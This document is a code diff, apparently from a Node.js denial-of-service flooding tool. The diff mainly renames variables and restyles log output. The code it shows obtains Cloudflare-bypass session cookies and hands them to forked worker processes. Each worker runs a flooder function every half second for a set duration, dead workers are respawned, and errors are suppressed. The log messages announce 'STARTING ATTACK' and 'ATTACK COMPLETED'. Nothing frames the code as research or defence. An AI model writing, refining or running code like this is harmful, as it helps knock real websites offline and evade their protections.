-        Global.BypassData = BypassResults;
+        const bypassResults = await bypassCloudflareParallel(args.cookieCount);
+        global.bypassData = bypassResults;
         
-        console.log(`\x1b[32m[+] Successfully Obtained ${BypassResults.length} Session(s)!\x1b[0m`);
-        console.log("\x1b[32m[+] Starting Attack...\x1b[0m");
+        console.log(`[+] SUCCESSFULLY OBTAINED ${bypassResults.length} SESSION(S)!`);
+        console.log("[+] STARTING ATTACK...");
         
-        Global.StartTime = Date.now();
+        global.startTime = Date.now();
         
-        for (let I = 0; I < Args.Threads; I++) {
-            const Worker = Cluster.fork();
-            Worker.send({ Type: 'BypassData', Data: BypassResults });
+        for (let i = 0; i < args.threads; i++) {
+            const worker = cluster.fork();
+            worker.send({ type: 'bypassData', data: bypassResults });
         }
         
-        const StatsInterval = setInterval(DisplayStats, 1000);
+        const statsInterval = setInterval(displayStats, 1000);
         
-        Cluster.on('message', (worker, message) => {
-            if (message.Type === 'Stats') {
-                Global.Workers[worker.id] = [worker, message];
+        cluster.on('message', (worker, message) => {
+            if (message.type === 'stats') {
+                global.workers[worker.id] = [worker, message];
             }
         });
         
-        Cluster.on('exit', (worker) => {
-             if (Date.now() - Global.StartTime < Args.Time * 1000) {
-                 const NewWorker = Cluster.fork();
-                 NewWorker.send({ Type: 'BypassData', Data: Global.BypassData });
+        cluster.on('exit', (worker) => {
+             if (Date.now() - global.startTime < args.time * 1000) {
+                 const newWorker = cluster.fork();
+                 newWorker.send({ type: 'bypassData', data: global.bypassData });
              }
         });
         
         setTimeout(() => {
-            clearInterval(StatsInterval);
-            console.log("\x1b[32m[+] Attack Completed!\x1b[0m");
+            clearInterval(statsInterval);
+            console.log("[+] ATTACK COMPLETED!");
             process.exit(0);
-        }, Args.Time * 1000);
+        }, args.time * 1000);
     })();
     
 } else {
-    let StatusesQ = [];
-    Global.TotalRequests = 0;
-    Global.Statuses = {};
+    let statusesQ = [];
+    global.totalRequests = 0;
+    global.statuses = {};
     
     process.on('message', (msg) => {
-        if (msg.Type === 'BypassData') {
-            Global.BypassData = msg.Data;
-            setInterval(() => RunFlooder(), 500);
+        if (msg.type === 'bypassData') {
+            global.bypassData = msg.data;
+            setInterval(() => runFlooder(), 500);
             
             setInterval(() => {
-                if (Object.keys(Global.Statuses).length > 0) {
-                    if (StatusesQ.length >= 4) StatusesQ.shift();
-                    StatusesQ.push({...Global.Statuses});
-                    Global.Statuses = {};
+                if (Object.keys(global.statuses).length > 0) {
+                    if (statusesQ.length >= 4) statusesQ.shift();
+                    statusesQ.push({...global.statuses});
+                    global.statuses = {};
                 }
                 process.send({
-                    Type: 'Stats',
-                    StatusesQ: StatusesQ,
-                    TotalRequests: Global.TotalRequests
+                    type: 'stats',
+                    statusesQ: statusesQ,
+                    totalRequests: global.totalRequests
                 });
             }, 250);
         }
     });
     
-    setTimeout(() => process.exit(0), Args.Time * 1000);
+    setTimeout(() => process.exit(0), args.time * 1000);
 }
 
 process.on('uncaughtException', () => {});
